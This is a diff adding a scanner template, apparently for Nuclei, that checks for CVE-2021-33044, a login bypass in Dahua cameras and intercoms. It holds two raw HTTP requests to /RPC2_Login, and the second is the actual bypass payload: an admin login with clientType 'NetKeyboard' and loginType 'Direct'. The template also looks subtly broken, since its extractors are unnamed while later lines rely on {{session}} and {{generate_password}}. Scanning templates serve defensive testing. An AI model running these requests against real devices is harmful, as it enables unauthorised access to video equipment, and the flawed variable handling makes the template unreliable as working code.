@@ -1,0 +1,52 @@
+id: CVE-2021-33044
+info:
+  name: DaHua Login Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SD, TPC, VTO, and IPC are video products under the umbrella of Dahua. The identity authentication bypass vulnerability allows attackers to bypass device identity authentication by constructing malicious data packets.
+  reference:
+    - https://www.dahuasecurity.com/support/cybersecurity/details/957
+  classification:
+    cve-id: CVE-2021-33044
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /RPC2_Login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        {"method": "global.login", "params": {"userName": "admin", "password": "", "clientType": "Web3.0", "loginType": "Direct"}, "id": 0, "session": 0}
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '\"realm\":\"(.*?)\"},'
+          - '\"random\":\"(.*?)\",\"realm\"'
+          - '\"session\":\"(.*?)\"}'
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '\"realm\":\"(.*?)\"},'
+          - '\"random\":\"(.*?)\",\"realm\"'
+          - '\"session\":\"(.*?)\"}'
+        internal: true
+
+  - raw:
+      - |
+        POST /RPC2_Login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        {"method": "global.login", "params": {"userName": "admin", "ipAddr": "127.0.0.1", "loginType": "Direct", "clientType": "NetKeyboard", "authorityType": "Default", "passwordType": "Default", "password": "{{generate_password}}"}, "id": 1, "session": "{{session}}"}
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '\"result\":true,\"session\":\"{{session}}\"'
